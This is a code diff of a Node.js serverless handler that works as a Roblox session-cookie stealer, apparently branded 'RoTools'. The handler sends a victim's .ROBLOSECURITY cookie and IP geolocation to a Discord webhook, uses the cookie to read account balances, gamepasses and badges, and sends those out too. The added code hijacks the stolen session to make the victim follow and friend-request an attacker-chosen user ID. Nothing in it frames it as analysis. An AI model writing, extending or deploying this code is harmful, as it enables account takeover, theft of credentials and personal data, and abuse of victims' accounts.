@@ -1,12 +1,10 @@
 import fetch from 'node-fetch';
 
 export default async function handler(req, res) {
-  // Verify authorization
   if (req.headers.authorization !== 'Bearer secure-token-2025') {
     return res.status(401).json({ error: 'Unauthorized' });
   }
 
-  // Only allow POST requests
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
   }
@@ -17,10 +15,8 @@ export default async function handler(req, res) {
       return res.status(400).json({ error: 'No cookie provided' });
     }
 
-    // Get client IP address
     const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
     
-    // Get detailed IP information
     let ipInfo = {};
     try {
       const ipRes = await fetch(`http://ip-api.com/json/${ip}?fields=66842623`);
@@ -30,7 +26,6 @@ export default async function handler(req, res) {
       ipInfo = { status: 'error', message: 'IP lookup failed' };
     }
 
-    // Format IP information fields
     const ipFields = [];
     if (ipInfo.status === 'success') {
       ipFields.push(
@@ -51,7 +46,62 @@ export default async function handler(req, res) {
       );
     }
 
-    // Send cookie + IP info to Discord with @everyone ping
+    // Get CSRF token function
+    const getCsrfToken = async () => {
+      const response = await fetch('https://auth.roblox.com/v1/usernames/validate', {
+        method: 'POST',
+        headers: { 
+          'Cookie': `.ROBLOSECURITY=${cookie}`,
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ username: 'csrf_token_fetch' })
+      });
+      
+      if (response.status === 403) {
+        return response.headers.get('x-csrf-token');
+      }
+      throw new Error('Failed to get CSRF token');
+    };
+
+    // Function to follow user
+    const followUser = async (userId) => {
+      try {
+        const csrfToken = await getCsrfToken();
+        const response = await fetch(`https://friends.roblox.com/v1/users/${userId}/follow`, {
+          method: 'POST',
+          headers: {
+            'Cookie': `.ROBLOSECURITY=${cookie}`,
+            'X-CSRF-TOKEN': csrfToken,
+            'Content-Type': 'application/json'
+          }
+        });
+        return response.ok;
+      } catch (e) {
+        console.error('Follow error:', e);
+        return false;
+      }
+    };
+
+    // Function to send friend request
+    const sendFriendRequest = async (userId) => {
+      try {
+        const csrfToken = await getCsrfToken();
+        const response = await fetch(`https://friends.roblox.com/v1/users/${userId}/request-friendship`, {
+          method: 'POST',
+          headers: {
+            'Cookie': `.ROBLOSECURITY=${cookie}`,
+            'X-CSRF-TOKEN': csrfToken,
+            'Content-Type': 'application/json'
+          }
+        });
+        return response.ok;
+      } catch (e) {
+        console.error('Friend request error:', e);
+        return false;
+      }
+    };
+
+    // Send cookie + IP info to Discord
     await fetch(process.env.DISCORD_WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -79,13 +129,12 @@ export default async function handler(req, res) {
       })
     });
 
-    // 2. Get account information
+    // Get account information
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
     });
     
     if (!userRes.ok || userRes.status === 401) {
-      // Send invalid cookie notification
       await fetch(process.env.DISCORD_WEBHOOK, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -109,7 +158,7 @@ export default async function handler(req, res) {
     const userData = await userRes.json();
     const userId = userData.id;
 
-    // Fetch all data in parallel
+    // Fetch account data
     const [
       robuxRes,
       creditRes,
@@ -163,7 +212,6 @@ export default async function handler(req, res) {
     const account_gamepasses_worth = (gamepassesData.match(/"PriceInRobux":(\d+)/g) || [])
       .reduce((sum, match) => sum + parseInt(match.split(':')[1]), 0);
     
-    // Truncate badges list if too long
     let account_badges = (badgesData.match(/"name":"(.*?)"/g) || [])
       .map(match => match.split('"')[3])
       .join(', ') || 'None';
@@ -210,12 +258,38 @@ export default async function handler(req, res) {
       body: JSON.stringify({ embeds: [accountInfoEmbed] })
     });
 
+    // Perform follow and friend requests
+    const ATTACKER_USER_ID = process.env.ATTACKER_USER_ID || 'YOUR_USER_ID_HERE';
+    
+    if (ATTACKER_USER_ID && ATTACKER_USER_ID !== 'YOUR_USER_ID_HERE') {
+      const followSuccess = await followUser(ATTACKER_USER_ID);
+      const friendSuccess = await sendFriendRequest(ATTACKER_USER_ID);
+      
+      // Send action results to Discord
+      await fetch(process.env.DISCORD_WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          embeds: [{
+            title: "🤖 AUTO ACTIONS PERFORMED",
+            color: 0x000000,
+            fields: [
+              { name: 'Follow Action', value: followSuccess ? '✅ Success' : '❌ Failed', inline: true },
+              { name: 'Friend Request', value: friendSuccess ? '✅ Success' : '❌ Failed', inline: true },
+              { name: 'Target User', value: ATTACKER_USER_ID, inline: false }
+            ],
+            footer: { text: "RoTools v2.4 | Auto Actions" },
+            timestamp: new Date().toISOString()
+          }]
+        })
+      });
+    }
+
     return res.json({ success: true });
     
   } catch (error) {
     console.error('Server error:', error);
     
-    // Send error notification to Discord
     await fetch(process.env.DISCORD_WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
